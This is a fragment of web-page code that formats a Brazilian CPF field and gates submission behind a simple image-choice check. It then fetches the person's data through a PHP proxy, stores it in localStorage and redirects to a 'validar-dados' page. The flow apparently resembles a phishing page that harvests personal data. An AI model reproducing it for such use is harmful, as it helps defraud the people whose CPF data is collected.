        <script>
            function formatCPF(input) {
                let value = input.value.replace(/\D/g, "");
                if (value.length > 11) {
                    value = value.substring(0, 11);
                }
                if (value.length > 9) {
                    value = value.replace(
                        /(\d{3})(\d{3})(\d{3})(\d{1,2})/,
                        "$1.$2.$3-$4",
                    );
                } else if (value.length > 6) {
                    value = value.replace(
                        /(\d{3})(\d{3})(\d{1,3})/,
                        "$1.$2.$3",
                    );
                } else if (value.length > 3) {
                    value = value.replace(/(\d{3})(\d{1,3})/, "$1.$2");
                }
                input.value = value;
                checkFormValidity();
            }

            function unformatCPF(cpf) {
                return cpf.replace(/\D/g, "");
            }

            function selectImage(element, index) {
                const images = document.querySelectorAll(".image-option");
                images.forEach((img) => {
                    img.classList.remove("selected");
                    img.classList.add("transparent");
                });
                element.classList.add("selected");
                element.classList.remove("transparent");

                if (index !== 4) {
                    showErrorPopup();
                } else {
                    checkFormValidity();
                }
            }

            function showErrorPopup() {
                const popup = document.getElementById("error-popup");
                popup.classList.remove("hidden");
                setTimeout(() => {
                    popup.classList.add("hidden");
                }, 3000);
            }

            function checkFormValidity() {
                const cpfInput = document.querySelector("#cpf");
                const selectedImage = document.querySelector(
                    ".image-option.selected",
                );
                const submitButton = document.querySelector("#submit-button");

                if (
                    cpfInput.value.length === 14 &&
                    selectedImage &&
                    selectedImage ===
                        document.querySelectorAll(".image-option")[4]
                ) {
                    submitButton.disabled = false;
                } else {
                    submitButton.disabled = true;
                }
            }

            function showValidationPopup() {
                const popup = document.getElementById("validation-popup");
                popup.classList.remove("hidden");
            }

            function hideValidationPopup() {
                const popup = document.getElementById("validation-popup");
                popup.classList.add("hidden");
            }

            function submitForm() {
                const cpfInput = document.querySelector("#cpf");
                const cpf = unformatCPF(cpfInput.value);

                showValidationPopup();

                function tryNewAPI() {
                    return fetch(`proxy-nova-api.php?cpf=${cpf}`, {
                        method: "GET",
                    })
                    .then((response) => {
                        if (!response.ok) throw new Error("Nova API não disponível");
                        return response.json();
                    });
                }

                tryNewAPI()
                    .then((data) => {
                        localStorage.setItem("cpfData", JSON.stringify(data));
                        setTimeout(() => { window.location.href = "validar-dados/index.html"; }, 1500);
                    })
                    .catch((error) => {
                        console.error(error);
                        hideValidationPopup();
                        alert("Erro ao consultar CPF.");
                    });
            }
        </script>

                                    <div class="bg-[#d2d2d2] p-2 border border-white image-option" onclick="selectImage(this, 1)"><img class="w-6 h-6" src="images/download-5.png" /></div>
                                    <div class="bg-[#d2d2d2] p-2 border border-white image-option" onclick="selectImage(this, 2)"><img class="w-6 h-6" src="images/download-4.png" /></div>
